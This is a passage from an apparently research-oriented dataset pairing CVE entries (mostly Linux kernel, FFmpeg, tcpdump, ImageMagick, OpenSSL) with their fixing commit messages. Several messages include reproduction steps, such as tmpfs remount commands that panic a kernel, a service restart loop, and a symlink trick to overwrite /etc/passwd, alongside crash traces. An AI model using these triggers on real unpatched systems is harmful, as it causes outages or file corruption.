13ac695 (""net:hns: Add support of Hip06 SoC to the Hislicon Network Subsystem"") Signed-off-by: Yunsheng Lin <linyunsheng@huawei.com> Signed-off-by: lipeng <lipeng321@huawei.com> Reported-by: Jun He <hjat2005@huawei.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-7522,CWE-125,2017-04-19,The ReadPSDImage function in MagickCore/locale.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.,
CVE-2016-6327,CWE-476,2016-10-16,drivers/infiniband/ulp/srpt/ib_srpt.c in the Linux kernel before 4.5.1 allows local users to cause a denial of service (NULL pointer dereference and system crash) by using an ABORT_TASK command to abort a device write operation.,
CVE-2012-1179,CWE-264,2012-05-17,"The Linux kernel before 3.3.1, when KVM is used, allows guest OS users to cause a denial of service (host OS crash) by leveraging administrative access to the guest OS, related to the pmd_none_or_clear_bad function and page faults for huge pages.",
CVE-2014-5139,,2014-08-13,The ssl_set_client_disabled function in t1_lib.c in OpenSSL 1.0.1 before 1.0.1i allows remote SSL servers to cause a denial of service (NULL pointer dereference and client application crash) via a ServerHello message that includes an SRP ciphersuite without the required negotiation of that ciphersuite with the client.,
CVE-2017-2647,CWE-476,2017-03-31,"The KEYS subsystem in the Linux kernel before 3.18 allows local users to gain privileges or cause a denial of service (NULL pointer dereference and system crash) via vectors involving a NULL value for a certain match field, related to the keyring_search_iterator function in keyring.c.","A previous patch added a ->match_preparse() method to the key type.  This is allowed to override the function called by the iteration algorithm. Therefore, we can just set a default that simply checks for an exact match of the key description with the original criterion data and allow match_preparse to override it as needed.  The key_type::match op is then redundant and can be removed, as can the user_match() function.  Signed-off-by: David Howells <dhowells@redhat.com> Acked-by: Vivek Goyal <vgoyal@redhat.com>"
CVE-2013-0216,CWE-20,2013-02-18,The Xen netback functionality in the Linux kernel before 3.7.8 allows guest OS users to cause a denial of service (loop) by triggering ring pointer corruption.,"A buggy or malicious frontend should not be able to confuse netback. If we spot anything which is not as it should be then shutdown the device and don't try to continue with the ring in a potentially hostile state. Well behaved and non-hostile frontends will not be penalised.  As well as making the existing checks for such errors fatal also add a new check that ensures that there isn't an insane number of requests on the ring (i.e. more than would fit in the ring). If the ring contains garbage then previously is was possible to loop over this insane number, getting an error each time and therefore not generating any more pending requests and therefore not exiting the loop in xen_netbk_tx_build_gops for an externded period.  Also turn various netdev_dbg calls which no precipitate a fatal error into netdev_err, they are rate limited because the device is shutdown afterwards.  This fixes at least one known DoS/softlockup of the backend domain.  Signed-off-by: Ian Campbell <ian.campbell@citrix.com> Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Acked-by: Jan Beulich <JBeulich@suse.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-14498,CWE-125,2019-03-07,get_8bit_row in rdbmp.c in libjpeg-turbo through 1.5.90 and MozJPEG through 3.3.1 allows attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted 8-bit BMP in which one or more of the color indices is out of range for the number of palette entries.,... in which one or more of the color indices is out of range for the number of palette entries.  Fix partly borrowed from jpeg-9c.  This commit also adopts Guido's JERR_PPM_OUTOFRANGE enum value in lieu of our project-specific JERR_PPM_TOOLARGE enum value.  Fixes #258
CVE-2015-8877,CWE-399,2016-05-22,"The gdImageScaleTwoPass function in gd_interpolation.c in the GD Graphics Library (aka libgd) before 2.2.0, as used in PHP before 5.6.12, uses inconsistent allocate and free approaches, which allows remote attackers to cause a denial of service (memory consumption) via a crafted call, as demonstrated by a call to the PHP imagescale function.","Fixing memory leak in gdImageScaleTwoPass, as reported by @cmb69 and confirmed by @vapier.  This bug actually bit me in production and I'm very thankful that it was reported with an easy fix.  Fixes #173."
CVE-2012-2686,CWE-310,2013-02-08,crypto/evp/e_aes_cbc_hmac_sha1.c in the AES-NI functionality in the TLS 1.1 and 1.2 implementations in OpenSSL 1.0.1 before 1.0.1d allows remote attackers to cause a denial of service (application crash) via crafted CBC data.,
CVE-2018-11383,CWE-908,2018-05-22,The r_strbuf_fini() function in radare2 2.5.0 allows remote attackers to cause a denial of service (invalid free and application crash) via a crafted ELF file because of an uninitialized variable in the CPSE handler in libr/anal/p/anal_avr.c.,
CVE-2015-0231,,2015-01-27,"Use-after-free vulnerability in the process_nested_data function in ext/standard/var_unserializer.re in PHP before 5.4.37, 5.5.x before 5.5.21, and 5.6.x before 5.6.5 allows remote attackers to execute arbitrary code via a crafted unserialize call that leverages improper handling of duplicate numerical keys within the serialized properties of an object.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-8142.",
CVE-2013-2058,CWE-119,2013-11-04,"The host_start function in drivers/usb/chipidea/host.c in the Linux kernel before 3.7.4 does not properly support a certain non-streaming option, which allows local users to cause a denial of service (system crash) by sending a large amount of network traffic through a USB/Ethernet adapter.","When running a scp transfer using a USB/Ethernet adapter the following crash happens:  $ scp test.tar.gz fabio@192.168.1.100:/home/fabio fabio@192.168.1.100's password: test.tar.gz                                      0%    0     0.0KB/s   --:-- ETA ------------[ cut here ]------------ WARNING: at net/sched/sch_generic.c:255 dev_watchdog+0x2cc/0x2f0() NETDEV WATCHDOG: eth0 (asix): transmit queue 0 timed out Modules linked in: Backtrace: [<80011c94>] (dump_backtrace+0x0/0x10c) from [<804d3a5c>] (dump_stack+0x18/0x1c)  r6:000000ff r5:80412388 r4:80685dc0 r3:80696cc0 [<804d3a44>] (dump_stack+0x0/0x1c) from [<80021868>] (warn_slowpath_common+0x54/0x6c) [<80021814>] (warn_slowpath_common+0x0/0x6c) from [<80021924>] (warn_slowpath_fmt+0x38/0x40) ...  Setting SDIS (Stream Disable Mode- bit 4 of USBMODE register) fixes the problem.  However, in current code CI13XXX_DISABLE_STREAMING flag is only set in udc mode, so allow disabling streaming also in host mode.  Tested on a mx6qsabrelite board.  Suggested-by: Peter Chen <peter.chen@freescale.com> Signed-off-by: Fabio Estevam <fabio.estevam@freescale.com> Reviewed-by: Peter Chen <peter.chen@freescale.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2017-13037,CWE-125,2017-09-14,The IP parser in tcpdump before 4.9.2 has a buffer over-read in print-ip.c:ip_printts().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2017-9991,CWE-119,2017-06-28,"Heap-based buffer overflow in the xwd_decode_frame function in libavcodec/xwddec.c in FFmpeg before 2.8.12, 3.0.x before 3.0.8, 3.1.x before 3.1.8, 3.2.x before 3.2.5, and 3.3.x before 3.3.1 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted file.",Fixes out of array access Fixes: 1399/clusterfuzz-testcase-minimized-4866094172995584  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2017-7866,CWE-787,2017-04-14,FFmpeg before 2017-01-23 has an out-of-bounds write caused by a stack-based buffer overflow related to the decode_zbuf function in libavcodec/pngdec.c.,Fixes out of array access Fixes: 444/fuzz-2-ffmpeg_VIDEO_AV_CODEC_ID_PNG_fuzzer  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2018-16640,CWE-772,2018-09-06,ImageMagick 7.0.8-5 has a memory leak vulnerability in the function ReadOneJNGImage in coders/png.c.,
CVE-2013-4591,CWE-119,2013-11-20,Buffer overflow in the __nfs4_get_acl_uncached function in fs/nfs/nfs4proc.c in the Linux kernel before 3.7.2 allows local users to cause a denial of service (memory corruption and system crash) or possibly have unspecified other impact via a getxattr system call for the system.nfs4_acl extended attribute of a pathname on an NFSv4 filesystem.,"Commit 1f1ea6c ""NFSv4: Fix buffer overflow checking in __nfs4_get_acl_uncached"" accidently dropped the checking for too small result buffer length.  If someone uses getxattr on ""system.nfs4_acl"" on an NFSv4 mount supporting ACLs, the ACL has not been cached and the buffer suplied is too short, we still copy the complete ACL, resulting in kernel and user space memory corruption.  Signed-off-by: Sven Wegener <sven.wegener@stealer.net> Cc: stable@kernel.org Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>"
CVE-2018-1999015,CWE-125,2018-07-23,FFmpeg before commit 5aba5b89d0b1d73164d3b81764828bb8b20ff32a contains an out of array read vulnerability in ASF_F format demuxer that can result in heap memory reading. This attack appear to be exploitable via specially crafted ASF file that has to provided as input. This vulnerability appears to have been fixed in 5aba5b89d0b1d73164d3b81764828bb8b20ff32a and later.,Fixes: out of array read Fixes: asff-crash-0e53d0dc491dfdd507530b66562812fbd4c36678  Found-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-10060,CWE-252,2017-03-02,"The ConcatenateImages function in MagickWand/magick-cli.c in ImageMagick before 7.0.1-10 does not check the return value of the fputc function, which allows remote attackers to cause a denial of service (application crash) via a crafted file.",
CVE-2016-5244,CWE-200,2016-06-27,"The rds_inc_info_copy function in net/rds/recv.c in the Linux kernel through 4.6.3 does not initialize a certain structure member, which allows remote attackers to obtain sensitive information from kernel stack memory by reading an RDS message.","The last field ""flags"" of object ""minfo"" is not initialized. Copying this object out may leak kernel stack data. Assign 0 to it to avoid leak.  Signed-off-by: Kangjie Lu <kjlu@gatech.edu> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-16229,CWE-125,2019-10-03,The DCCP parser in tcpdump before 4.9.3 has a buffer over-read in print-dccp.c:dccp_print_option().,Add some comments.  Moreover: Put a function definition name at the beginning of the line.  (This change was ported from commit 6df4852 in the master branch.)  Ryan Ackroyd had independently identified this buffer over-read later by means of fuzzing and provided the packet capture file for the test.
CVE-2013-2930,CWE-264,2013-12-09,"The perf_trace_event_perm function in kernel/trace/trace_event_perf.c in the Linux kernel before 3.12.2 does not properly restrict access to the perf subsystem, which allows local users to enable function tracing via a crafted application.","The current default perf paranoid level is ""1"" which has ""perf_paranoid_kernel()"" return false, and giving any operations that use it, access to normal users. Unfortunately, this includes function tracing and normal users should not be allowed to enable function tracing by default.  The proper level is defined at ""-1"" (full perf access), which ""perf_paranoid_tracepoint_raw()"" will only give access to. Use that check instead for enabling function tracing.  Reported-by: Dave Jones <davej@redhat.com> Reported-by: Vince Weaver <vincent.weaver@maine.edu> Tested-by: Vince Weaver <vincent.weaver@maine.edu> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Ingo Molnar <mingo@kernel.org> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Frederic Weisbecker <fweisbec@gmail.com> Cc: stable@vger.kernel.org # 3.4+ CVE: CVE-2013-2930 Fixes: ced3900 (""ftrace, perf: Add support to use function tracepoint in perf"") Signed-off-by: Steven Rostedt <rostedt@goodmis.org>"
CVE-2018-14356,CWE-824,2018-07-17,An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. pop.c mishandles a zero-length UID.,
CVE-2017-13050,CWE-125,2017-09-14,The RPKI-Router parser in tcpdump before 4.9.2 has a buffer over-read in print-rpki-rtr.c:rpki_rtr_pdu_print().,"The decoder didn't properly check that the PDU length stored in the PDU header is correct. The only check in place was in rpki_rtr_print() and it tested whether the length is zero but that is not sufficient. Make all necessary length and bounds checks, both generic and type-specific, in rpki_rtr_pdu_print() and reduce rpki_rtr_print() to a simple loop.  This also fixes a minor bug and PDU type 0 (Serial Notify from RFC 6810 Section 5.2) is valid again.  In rpki_rtr_pdu_print() any protocol version was considered version 0, fix it to skip the rest of input if the PDU protocol version is unknown.  Ibid, the PDU type 10 (Error Report from RFC 6810 Section 5.10) case block didn't consider the ""Length of Error Text"" data element mandatory, put it right.  Ibid, when printing an encapsulated PDU, give itself (via recursion) respective buffer length to make it possible to tell whether the encapsulated PDU fits. Do not recurse deeper than 2nd level.  Update prior RPKI-Router test cases that now stop to decode earlier because of the stricter checks.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2013-3735,CWE-20,2013-05-31,"The Zend Engine in PHP before 5.4.16 RC1, and 5.5.0 before RC2, does not properly determine whether a parser error occurred, which allows context-dependent attackers to cause a denial of service (memory consumption and application crash) via a crafted function definition, as demonstrated by an attack within a shared web-hosting environment.  NOTE: the vendor's http://php.net/security-note.php page says ""for critical security situations you should be using OS-level security by running multiple web servers each as their own user id.",
CVE-2014-9940,CWE-416,2017-05-02,The regulator_ena_gpio_free function in drivers/regulator/core.c in the Linux kernel before 3.19 allows local users to gain privileges or cause a denial of service (use-after-free) via a crafted application.,"After freeing pin from regulator_ena_gpio_free, loop can access the pin. So this patch fixes not to access pin after freeing.  Signed-off-by: Seung-Woo Kim <sw0312.kim@samsung.com> Signed-off-by: Mark Brown <broonie@kernel.org>"
CVE-2018-19044,CWE-59,2018-11-08,"keepalived 2.0.8 didn't check for pathnames with symlinks when writing data to a temporary file upon a call to PrintData or PrintStats. This allowed local users to overwrite arbitrary files if fs.protected_symlinks is set to 0, as demonstrated by a symlink from /tmp/keepalived.data or /tmp/keepalived.stats to /etc/passwd.","Issue #1048 identified that if, for example, a non privileged user created a symbolic link from /etc/keepalvied.data to /etc/passwd, writing to /etc/keepalived.data (which could be invoked via DBus) would cause /etc/passwd to be overwritten.  This commit stops keepalived writing to pathnames where the ultimate component is a symbolic link, by setting O_NOFOLLOW whenever opening a file for writing.  This might break some setups, where, for example, /etc/keepalived.data was a symbolic link to /home/fred/keepalived.data. If this was the case, instead create a symbolic link from /home/fred/keepalived.data to /tmp/keepalived.data, so that the file is still accessible via /home/fred/keepalived.data.  There doesn't appear to be a way around this backward incompatibility, since even checking if the pathname is a symbolic link prior to opening for writing would create a race condition.  Signed-off-by: Quentin Armitage <quentin@armitage.org.uk>"
CVE-2018-14358,CWE-787,2018-07-17,An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. imap/message.c has a stack-based buffer overflow for a FETCH response with a long RFC822.SIZE field.,
CVE-2019-14463,CWE-125,2019-07-31,"An issue was discovered in libmodbus before 3.0.7 and 3.1.x before 3.1.5. There is an out-of-bounds read for the MODBUS_FC_WRITE_MULTIPLE_REGISTERS case, aka VD-1301.",This patch was contributed by Maor Vermucht and Or Peles from VDOO Connected Trust.
CVE-2013-1767,CWE-399,2013-02-28,Use-after-free vulnerability in the shmem_remount_fs function in mm/shmem.c in the Linux kernel before 3.7.10 allows local users to gain privileges or cause a denial of service (system crash) by remounting a tmpfs filesystem without specifying a required mpol (aka mempolicy) mount option.,"The tmpfs remount logic preserves filesystem mempolicy if the mpol=M option is not specified in the remount request.  A new policy can be specified if mpol=M is given.  Before this patch remounting an mpol bound tmpfs without specifying mpol= mount option in the remount request would set the filesystem's mempolicy object to a freed mempolicy object.  To reproduce the problem boot a DEBUG_PAGEALLOC kernel and run:     # mkdir /tmp/x      # mount -t tmpfs -o size=100M,mpol=interleave nodev /tmp/x      # grep /tmp/x /proc/mounts     nodev /tmp/x tmpfs rw,relatime,size=102400k,mpol=interleave:0-3 0 0      # mount -o remount,size=200M nodev /tmp/x      # grep /tmp/x /proc/mounts     nodev /tmp/x tmpfs rw,relatime,size=204800k,mpol=??? 0 0         # note ? garbage in mpol=... output above      # dd if=/dev/zero of=/tmp/x/f count=1         # panic here  Panic:     BUG: unable to handle kernel NULL pointer dereference at           (null)     IP: [<          (null)>]           (null)     [...]     Oops: 0010 [#1] SMP DEBUG_PAGEALLOC     Call Trace:       mpol_shared_policy_init+0xa5/0x160       shmem_get_inode+0x209/0x270       shmem_mknod+0x3e/0xf0       shmem_create+0x18/0x20       vfs_create+0xb5/0x130       do_last+0x9a1/0xea0       path_openat+0xb3/0x4d0       do_filp_open+0x42/0xa0       do_sys_open+0xfe/0x1e0       compat_sys_open+0x1b/0x20       cstar_dispatch+0x7/0x1f  Non-debug kernels will not crash immediately because referencing the dangling mpol will not cause a fault.  Instead the filesystem will reference a freed mempolicy object, which will cause unpredictable behavior.  The problem boils down to a dropped mpol reference below if shmem_parse_options() does not allocate a new mpol:      config = *sbinfo     shmem_parse_options(data, &config, true)     mpol_put(sbinfo->mpol)     sbinfo->mpol = config.mpol  /* BUG: saves unreferenced mpol */  This patch avoids the crash by not releasing the mempolicy if shmem_parse_options() doesn't create a new mpol.  How far back does this issue go? I see it in both 2.6.36 and 3.3.  I did not look back further.  Signed-off-by: Greg Thelen <gthelen@google.com> Acked-by: Hugh Dickins <hughd@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-12898,CWE-125,2017-09-14,The NFS parser in tcpdump before 4.9.2 has a buffer over-read in print-nfs.c:interp_reply().,"Fix the bounds checking for the NFSv3 WRITE procedure to check whether the length of the opaque data being written is present in the captured data, not just whether the byte count is present in the captured data. furthest forward in the packet, not the item before it.  (This also lets us eliminate the check for the ""stable"" argument being present in the captured data; rewrite the code to print that to make it a bit clearer.)  Check that the entire ar_stat field is present in the capture.  Note that parse_wcc_attr() is called after we've already checked whether the wcc_data is present.  Check before fetching the ""access"" part of the NFSv3 ACCESS results. This fixes a buffer over-read discovered by Kamil Frankowicz.  Include a test for the ""check before fetching the ""access"" part..."" fix, using the capture supplied by the reporter(s)."
CVE-2016-10166,CWE-191,2017-03-15,Integer underflow in the _gdContributionsAlloc function in gd_interpolation.c in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to have unspecified impact via vectors related to decrementing the u variable.,"No need to decrease `u`, so we don't do it. While we're at it, we also factor out the overflow check of the loop, what improves performance and readability.  This issue has been reported by Stefan Esser to security@libgd.org."
CVE-2019-9003,CWE-416,2019-02-22,"In the Linux kernel before 4.20.5, attackers can trigger a drivers/char/ipmi/ipmi_msghandler.c use-after-free and OOPS by arranging for certain simultaneous execution of the code, as demonstrated by a ""service ipmievd restart"" loop.","When we do the following test, we got oops in ipmi_msghandler driver while((1)) do 	service ipmievd restart & service ipmievd restart done  --------------------------------------------------------------- [  294.230186] Unable to handle kernel paging request at virtual address 0000803fea6ea008 [  294.230188] Mem abort info: [  294.230190]   ESR = 0x96000004 [  294.230191]   Exception class = DABT (current EL), IL = 32 bits [  294.230193]   SET = 0, FnV = 0 [  294.230194]   EA = 0, S1PTW = 0 [  294.230195] Data abort info: [  294.230196]   ISV = 0, ISS = 0x00000004 [  294.230197]   CM = 0, WnR = 0 [  294.230199] user pgtable: 4k pages, 48-bit VAs, pgdp = 00000000a1c1b75a [  294.230201] [0000803fea6ea008] pgd=0000000000000000 [  294.230204] Internal error: Oops: 96000004 [#1] SMP [  294.235211] Modules linked in: nls_utf8 isofs rpcrdma ib_iser ib_srpt target_core_mod ib_srp scsi_transport_srp ib_ipoib rdma_ucm ib_umad rdma_cm ib_cm iw_cm dm_mirror dm_region_hash dm_log dm_mod aes_ce_blk crypto_simd cryptd aes_ce_cipher ghash_ce sha2_ce ses sha256_arm64 sha1_ce hibmc_drm hisi_sas_v2_hw enclosure sg hisi_sas_main sbsa_gwdt ip_tables mlx5_ib ib_uverbs marvell ib_core mlx5_core ixgbe ipmi_si mdio hns_dsaf ipmi_devintf ipmi_msghandler hns_enet_drv hns_mdio [  294.277745] CPU: 3 PID: 0 Comm: swapper/3 Kdump: loaded Not tainted 5.0.0-rc2+ #113 [  294.285511] Hardware name: Huawei TaiShan 2280 /BC11SPCD, BIOS 1.37 11/21/2017 [  294.292835] pstate: 80000005 (Nzcv daif -PAN -UAO) [  294.297695] pc : __srcu_read_lock+0x38/0x58 [  294.301940] lr : acquire_ipmi_user+0x2c/0x70 [ipmi_msghandler] [  294.307853] sp : ffff00001001bc80 [  294.311208] x29: ffff00001001bc80 x28: ffff0000117e5000 [  294.316594] x27: 0000000000000000 x26: dead000000000100 [  294.321980] x25: dead000000000200 x24: ffff803f6bd06800 [  294.327366] x23: 0000000000000000 x22: 0000000000000000 [  294.332752] x21: ffff00001001bd04 x20: ffff80df33d19018 [  294.338137] x19: ffff80df33d19018 x18: 0000000000000000 [  294.343523] x17: 0000000000000000 x16: 0000000000000000 [  294.348908] x15: 0000000000000000 x14: 0000000000000002 [  294.354293] x13: 0000000000000000 x12: 0000000000000000 [  294.359679] x11: 0000000000000000 x10: 0000000000100000 [  294.365065] x9 : 0000000000000000 x8 : 0000000000000004 [  294.370451] x7 : 0000000000000000 x6 : ffff80df34558678 [  294.375836] x5 : 000000000000000c x4 : 0000000000000000 [  294.381221] x3 : 0000000000000001 x2 : 0000803fea6ea000 [  294.386607] x1 : 0000803fea6ea008 x0 : 0000000000000001 [  294.391994] Process swapper/3 (pid: 0, stack limit = 0x0000000083087293) [  294.398791] Call trace: [  294.401266]  __srcu_read_lock+0x38/0x58 [  294.405154]  acquire_ipmi_user+0x2c/0x70 [ipmi_msghandler] [  294.410716]  deliver_response+0x80/0xf8 [ipmi_msghandler] [  294.416189]  deliver_local_response+0x28/0x68 [ipmi_msghandler] [  294.422193]  handle_one_recv_msg+0x158/0xcf8 [ipmi_msghandler] [  294.432050]  handle_new_recv_msgs+0xc0/0x210 [ipmi_msghandler] [  294.441984]  smi_recv_tasklet+0x8c/0x158 [ipmi_msghandler] [  294.451618]  tasklet_action_common.isra.5+0x88/0x138 [  294.460661]  tasklet_action+0x2c/0x38 [  294.468191]  __do_softirq+0x120/0x2f8 [  294.475561]  irq_exit+0x134/0x140 [  294.482445]  __handle_domain_irq+0x6c/0xc0 [  294.489954]  gic_handle_irq+0xb8/0x178 [  294.497037]  el1_irq+0xb0/0x140 [  294.503381]  arch_cpu_idle+0x34/0x1a8 [  294.510096]  do_idle+0x1d4/0x290 [  294.516322]  cpu_startup_entry+0x28/0x30 [  294.523230]  secondary_start_kernel+0x184/0x1d0 [  294.530657] Code: d538d082 d2800023 8b010c81 8b020021 (c85f7c25) [  294.539746] ---[ end trace 8a7a880dee570b29 ]--- [  294.547341] Kernel panic - not syncing: Fatal exception in interrupt [  294.556837] SMP: stopping secondary CPUs [  294.563996] Kernel Offset: disabled [  294.570515] CPU features: 0x002,21006008 [  294.577638] Memory Limit: none [  294.587178] Starting crashdump kernel... [  294.594314] Bye!  Because the user->release_barrier.rda is freed in ipmi_destroy_user(), but the refcount is not zero, when acquire_ipmi_user() uses user->release_barrier.rda in __srcu_read_lock(), it causes oops. Fix this by calling cleanup_srcu_struct() when the refcount is zero.  Fixes: e86ee2d (""ipmi: Rework locking and shutdown for hot remove"") Cc: stable@vger.kernel.org # 4.18 Signed-off-by: Yang Yingliang <yangyingliang@huawei.com>  Signed-off-by: Corey Minyard <cminyard@mvista.com>"
CVE-2014-3601,CWE-189,2014-09-01,"The kvm_iommu_map_pages function in virt/kvm/iommu.c in the Linux kernel through 3.16.1 miscalculates the number of pages during the handling of a mapping failure, which allows guest OS users to (1) cause a denial of service (host OS memory corruption) or possibly have unspecified other impact by triggering a large gfn value or (2) cause a denial of service (host OS memory consumption) by triggering a small gfn value that leads to permanently pinned pages.","The third parameter of kvm_iommu_put_pages is wrong, It should be 'gfn - slot->base_gfn'.  By making gfn very large, malicious guest or userspace can cause kvm to go to this error path, and subsequently to pass a huge value as size. Alternatively if gfn is small, then pages would be pinned but never unpinned, causing host memory leak and local DOS.  Passing a reasonable but large value could be the most dangerous case, because it would unpin a page that should have stayed pinned, and thus allow the device to DMA into arbitrary memory.  However, this cannot happen because of the condition that can trigger the error:  - out of memory (where you can't allocate even a single page)   should not be possible for the attacker to trigger  - when exceeding the iommu's address space, guest pages after gfn   will also exceed the iommu's address space, and inside   kvm_iommu_put_pages() the iommu_iova_to_phys() will fail.  The   page thus would not be unpinned at all.  Reported-by: Jack Morgenstein <jackm@mellanox.com> Cc: stable@vger.kernel.org Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2018-7186,CWE-787,2018-02-16,"Leptonica before 1.75.3 does not limit the number of characters in a %s format argument to fscanf or sscanf, which allows remote attackers to cause a denial of service (stack-based buffer overflow) or possibly have unspecified other impact via a long string, as demonstrated by the gplotRead and ptaReadStream functions.",* Fixed a debian security issue with fscanf() reading a string with   possible buffer overflow. * There were also a few similar situations with sscanf().
CVE-2017-14173,CWE-190,2017-09-07,"In the function ReadTXTImage() in coders/txt.c in ImageMagick 7.0.6-10, an integer overflow might occur for the addition operation ""GetQuantumRange(depth)+1"" when ""depth"" is large, producing a smaller value than expected. As a result, an infinite loop would occur for a crafted TXT file that claims a very large ""max_value"" value.",
CVE-2015-0293,CWE-20,2015-03-19,"The SSLv2 implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a allows remote attackers to cause a denial of service (s2_lib.c assertion failure and daemon exit) via a crafted CLIENT-MASTER-KEY message.",
CVE-2016-5400,CWE-119,2016-08-06,Memory leak in the airspy_probe function in drivers/media/usb/airspy/airspy.c in the airspy USB driver in the Linux kernel before 4.7 allows local users to cause a denial of service (memory consumption) via a crafted USB device that emulates many VFL_TYPE_SDR or VFL_TYPE_SUBDEV devices and performs many connect and disconnect operations.,"Fix a memory leak on probe error of the airspy usb device driver.  The problem is triggered when more than 64 usb devices register with v4l2 of type VFL_TYPE_SDR or VFL_TYPE_SUBDEV.  The memory leak is caused by the probe function of the airspy driver mishandeling errors and not freeing the corresponding control structures when an error occours registering the device to v4l2 core.  A badusb device can emulate 64 of these devices, and then through continual emulated connect/disconnect of the 65th device, cause the kernel to run out of RAM and crash the kernel, thus causing a local DOS vulnerability.  Fixes CVE-2016-5400  Signed-off-by: James Patrick-Evans <james@jmp-e.com> Reviewed-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org # 3.17+ Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-6767,CWE-125,2018-02-06,A stack-based buffer over-read in the ParseRiffHeaderConfig function of cli/riff.c file of WavPack 5.1.0 allows a remote attacker to cause a denial-of-service attack or possibly have unspecified other impact via a maliciously crafted RF64 file.,
CVE-2014-2013,CWE-119,2014-03-03,Stack-based buffer overflow in the xps_parse_color function in xps/xps-common.c in MuPDF 1.3 and earlier allows remote attackers to execute arbitrary code via a large number of entries in the ContextColor value of the Fill attribute in a Path element.,
CVE-2017-12901,CWE-125,2017-09-14,The EIGRP parser in tcpdump before 4.9.2 has a buffer over-read in print-eigrp.c:eigrp_print().,This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s).
CVE-2014-9914,CWE-362,2017-02-07,Race condition in the ip4_datagram_release_cb function in net/ipv4/datagram.c in the Linux kernel before 3.15.2 allows local users to gain privileges or cause a denial of service (use-after-free) by leveraging incorrect expectations about locking during multithreaded access to internal data structures for IPv4 UDP sockets.,"Alexey gave a AddressSanitizer[1] report that finally gave a good hint at where was the origin of various problems already reported by Dormando in the past [2]  Problem comes from the fact that UDP can have a lockless TX path, and concurrent threads can manipulate sk_dst_cache, while another thread, is holding socket lock and calls __sk_dst_set() in ip4_datagram_release_cb() (this was added in linux-3.8)  It seems that all we need to do is to use sk_dst_check() and sk_dst_set() so that all the writers hold same spinlock (sk->sk_dst_lock) to prevent corruptions.  TCP stack do not need this protection, as all sk_dst_cache writers hold the socket lock.  [1] https://code.google.com/p/address-sanitizer/wiki/AddressSanitizerForKernel  AddressSanitizer: heap-use-after-free in ipv4_dst_check Read of size 2 by thread T15453:  [<ffffffff817daa3a>] ipv4_dst_check+0x1a/0x90 ./net/ipv4/route.c:1116  [<ffffffff8175b789>] __sk_dst_check+0x89/0xe0 ./net/core/sock.c:531  [<ffffffff81830a36>] ip4_datagram_release_cb+0x46/0x390 ??:0  [<ffffffff8175eaea>] release_sock+0x17a/0x230 ./net/core/sock.c:2413  [<ffffffff81830882>] ip4_datagram_connect+0x462/0x5d0 ??:0  [<ffffffff81846d06>] inet_dgram_connect+0x76/0xd0 ./net/ipv4/af_inet.c:534  [<ffffffff817580ac>] SYSC_connect+0x15c/0x1c0 ./net/socket.c:1701  [<ffffffff817596ce>] SyS_connect+0xe/0x10 ./net/socket.c:1682  [<ffffffff818b0a29>] system_call_fastpath+0x16/0x1b ./arch/x86/kernel/entry_64.S:629  Freed by thread T15455:  [<ffffffff8178d9b8>] dst_destroy+0xa8/0x160 ./net/core/dst.c:251  [<ffffffff8178de25>] dst_release+0x45/0x80 ./net/core/dst.c:280  [<ffffffff818304c1>] ip4_datagram_connect+0xa1/0x5d0 ??:0  [<ffffffff81846d06>] inet_dgram_connect+0x76/0xd0 ./net/ipv4/af_inet.c:534  [<ffffffff817580ac>] SYSC_connect+0x15c/0x1c0 ./net/socket.c:1701  [<ffffffff817596ce>] SyS_connect+0xe/0x10 ./net/socket.c:1682  [<ffffffff818b0a29>] system_call_fastpath+0x16/0x1b ./arch/x86/kernel/entry_64.S:629  Allocated by thread T15453:  [<ffffffff8178d291>] dst_alloc+0x81/0x2b0 ./net/core/dst.c:171  [<ffffffff817db3b7>] rt_dst_alloc+0x47/0x50 ./net/ipv4/route.c:1406  [<     inlined    >] __ip_route_output_key+0x3e8/0xf70 __mkroute_output ./net/ipv4/route.c:1939  [<ffffffff817dde08>] __ip_route_output_key+0x3e8/0xf70 ./net/ipv4/route.c:2161  [<ffffffff817deb34>] ip_route_output_flow+0x14/0x30 ./net/ipv4/route.c:2249  [<ffffffff81830737>] ip4_datagram_connect+0x317/0x5d0 ??:0  [<ffffffff81846d06>] inet_dgram_connect+0x76/0xd0 ./net/ipv4/af_inet.c:534  [<ffffffff817580ac>] SYSC_connect+0x15c/0x1c0 